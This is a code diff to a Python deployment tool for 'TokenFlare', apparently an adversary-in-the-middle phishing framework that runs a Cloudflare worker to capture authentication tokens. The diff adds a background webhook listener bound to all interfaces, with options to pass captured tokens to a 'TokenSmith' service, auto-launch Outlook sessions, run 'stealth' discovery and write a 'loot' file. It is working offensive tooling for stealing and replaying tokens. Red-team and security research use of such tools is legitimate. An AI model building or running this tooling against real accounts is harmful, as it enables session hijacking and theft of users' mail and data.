@@ -6,6 +6,7 @@ All command functions (init, configure, deploy, status, version)
 
 import os
 import sys
+import time
 import shutil
 import subprocess
 import configparser
@@ -622,7 +623,7 @@ worker_name = your-worker-name
             print("[!] Invalid option")
             return 1
 
-    def cmd_deploy_local(self) -> int:
+    def cmd_deploy_local(self, args=None) -> int:
         """Deploy worker locally using wrangler dev"""
         # Check for root (needed for binding to port 443)
         require_root("deploy local")
@@ -692,6 +693,26 @@ worker_name = your-worker-name
         print("[*] Press Ctrl+C to stop")
         print()
 
+        # Session Launcher integration config (from CLI args or defaults)
+        webhook_port = getattr(args, 'webhook_port', 9999) if args else 9999
+        tokensmith_url = getattr(args, 'tokensmith_url', None) if args else None
+        auto_launch = getattr(args, 'auto_launch', False) if args else False
+        launch_target = getattr(args, 'launch_target', 'outlook') if args else 'outlook'
+        auto_discover = getattr(args, 'auto_discover', False) if args else False
+        discover_mode = getattr(args, 'discover_mode', 'stealth') if args else 'stealth'
+        output_file = getattr(args, 'loot_file', None) if args else None
+
+        # Check for TOKENSMITH_URL in wrangler.toml vars (CLI arg takes precedence)
+        if not tokensmith_url:
+            tokensmith_url = vars_section.get('TOKENSMITH_URL', None)
+
+        # Ensure WEBHOOK_URL points to local webhook listener
+        current_webhook = vars_section.get('WEBHOOK_URL', '')
+        local_webhook = f'http://localhost:{webhook_port}'
+        if not current_webhook or 'CHANGEME' in current_webhook:
+            update_wrangler_var(self.wrangler_toml, 'WEBHOOK_URL', local_webhook)
+            print(f"[*] Set WEBHOOK_URL to {local_webhook}")
+
         # 5. Build and run wrangler dev command
         cmd = wrangler_cmd + [
             'dev',
@@ -702,12 +723,67 @@ worker_name = your-worker-name
             '--https-cert-path', str(cert_path)
         ]
 
+        # Start webhook listener as a background process
+        webhook_cmd = [
+            sys.executable,
+            str(self.project_root / 'tokenflare-webhook.py'),
+            '-p', str(webhook_port),
+            '-b', '0.0.0.0',
+        ]
+        if tokensmith_url:
+            webhook_cmd.extend(['--tokensmith-url', tokensmith_url])
+        if auto_launch:
+            webhook_cmd.extend(['--auto-launch', '--launch-target', launch_target])
+        if auto_discover:
+            webhook_cmd.extend(['--auto-discover', '--discover-mode', discover_mode])
+        if output_file:
+            webhook_cmd.extend(['-o', output_file])
+
+        print(f"\n[*] Starting webhook listener on port {webhook_port}...")
+        webhook_proc = subprocess.Popen(
+            webhook_cmd,
+            cwd=self.project_root,
+            stdout=subprocess.PIPE,
+            stderr=subprocess.STDOUT,
+        )
+
+        # Give webhook a moment to start
+        time.sleep(1)
+        if webhook_proc.poll() is not None:
+            print(f"[!] Webhook listener failed to start (exit code: {webhook_proc.returncode})")
+            return 1
+
+        print(f"[+] Webhook listener running (PID: {webhook_proc.pid})")
+
+        print(f"\n{'='*60}")
+        print(f"  TokenFlare Local Deployment")
+        print(f"  Worker:    https://localhost:443")
+        print(f"  Webhook:   http://localhost:{webhook_port}")
+        if tokensmith_url:
+            print(f"  TokenSmith: {tokensmith_url}")
+            if auto_launch:
+                print(f"  Auto-launch: {launch_target}")
+            if auto_discover:
+                print(f"  Auto-discover: {discover_mode} mode")
+        print(f"{'='*60}\n")
+
         try:
-            # Run interactively - don't capture output
+            # Run wrangler dev (blocking)
+            print(f"\n[*] Starting wrangler dev...")
             subprocess.run(cmd, cwd=self.project_root)
             return 0
         except KeyboardInterrupt:
             print("\n\n[*] Shutting down local deployment...")
+        finally:
+            # Clean up webhook listener
+            if webhook_proc and webhook_proc.poll() is None:
+                print("[*] Stopping webhook listener...")
+                webhook_proc.terminate()
+                try:
+                    webhook_proc.wait(timeout=5)
+                except subprocess.TimeoutExpired:
+                    webhook_proc.kill()
+                print("[+] Webhook listener stopped.")
             return 0
 
     def cmd_deploy_remote(self) -> int:
